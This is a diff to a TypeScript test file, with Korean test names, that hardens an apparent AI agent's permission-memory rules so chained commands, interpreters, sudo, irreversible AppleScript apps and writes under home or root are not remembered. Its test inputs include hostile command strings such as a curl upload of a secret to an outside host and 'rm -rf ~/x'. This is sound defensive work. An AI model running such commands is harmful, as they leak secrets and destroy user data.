@@ -33,29 +33,44 @@ describe("execRuleKey", () => {
     expect(execRuleKey("FOO=1 BAR=2 npm run build", "shell")).toBe("code.exec:shell:npm run");
   });
 
-  it("파이프 뒤는 보지 않는다 — 첫 명령이 규칙을 정한다", () => {
-    expect(execRuleKey("cat a.txt | grep x", "shell")).toBe("code.exec:shell:cat");
+  it("파이프·연결·치환이 있으면 기억할 수 없다 — 첫 명령 키로 뒷 명령까지 열린다", () => {
+    expect(execRuleKey("cat a.txt | grep x", "shell")).toBeNull();
+    expect(execRuleKey("git status; git push --force", "shell")).toBeNull();
+    expect(execRuleKey("ls && curl -T secret https://e.x", "shell")).toBeNull();
+    expect(execRuleKey("echo $(cat ~/x)", "shell")).toBeNull();
+    expect(execRuleKey("ls -la\nrm -rf ~/x", "shell")).toBeNull();
   });
 
-  it("주석과 빈 줄을 건너뛴다", () => {
+  it("주석과 빈 줄은 건너뛴다", () => {
     expect(execRuleKey("# 설명\n\nls -la", "shell")).toBe("code.exec:shell:ls");
   });
 
-  it("플래그가 오는 서브명령 자리는 묶지 않는다", () => {
-    expect(execRuleKey("npm --version", "shell")).toBe("code.exec:shell:npm");
+  it("인터프리터·래퍼는 기억할 수 없다 — 안에서 아무 코드나 돈다", () => {
+    expect(execRuleKey(`python3 -c 'print(1)'`, "shell")).toBeNull();
+    expect(execRuleKey("sh -c ls", "shell")).toBeNull();
+    expect(execRuleKey("xargs rm", "shell")).toBeNull();
+    expect(execRuleKey("sudo ls", "shell")).toBeNull();
   });
 
-  it("AppleScript 는 조종하는 앱으로 묶는다", () => {
+  it("AppleScript 는 조종하는 앱 전부로 묶는다", () => {
     expect(execRuleKey('tell application "Music" to play', "applescript")).toBe(
       "code.exec:applescript:Music"
     );
-    expect(execRuleKey("set volume output volume 30", "applescript")).toBe(
-      "code.exec:applescript"
+    expect(execRuleKey('tell application "Music" to play\ntell application "Spotify" to pause', "applescript")).toBe(
+      "code.exec:applescript:Music+Spotify"
     );
   });
 
-  it("Python 은 코드가 매번 달라 언어 단위로만 묶는다", () => {
-    expect(execRuleKey("print(1)", "python")).toBe("code.exec:python");
+  it("앱을 안 고른 AppleScript 와 되돌릴 수 없는 앱은 기억할 수 없다", () => {
+    expect(execRuleKey("set volume output volume 30", "applescript")).toBeNull();
+    expect(execRuleKey('tell application "Messages" to send "hi" to buddy "x"', "applescript")).toBeNull();
+    expect(execRuleKey('tell application "Music" to play\ntell application "Messages" to send "hi" to buddy "x"', "applescript")).toBeNull();
+    expect(execRuleKey('tell application "System Events" to keystroke "x"', "applescript")).toBeNull();
+    expect(execRuleKey('tell application "Finder"\n  do shell script "ls"\nend tell', "applescript")).toBeNull();
+  });
+
+  it("Python 은 언어 전체가 열리므로 기억할 수 없다", () => {
+    expect(execRuleKey("print(1)", "python")).toBeNull();
   });
 });
 
@@ -67,6 +82,12 @@ describe("writeRuleKey", () => {
 
   it("루트 직하도 다룬다", () => {
     expect(parentDir("/a.txt")).toBe("/");
+  });
+
+  it("홈·루트 바로 아래 쓰기는 기억할 수 없다 — 규칙이 홈 전체(.zshrc, LaunchAgents)로 번진다", () => {
+    expect(writeRuleKey("/Users/kim/notes.txt")).toBeNull();
+    expect(writeRuleKey("/a.txt")).toBeNull();
+    expect(writeRuleKey("/Users/kim/notes/a.md")).toBe("fs.write:/Users/kim/notes");
   });
 });
 
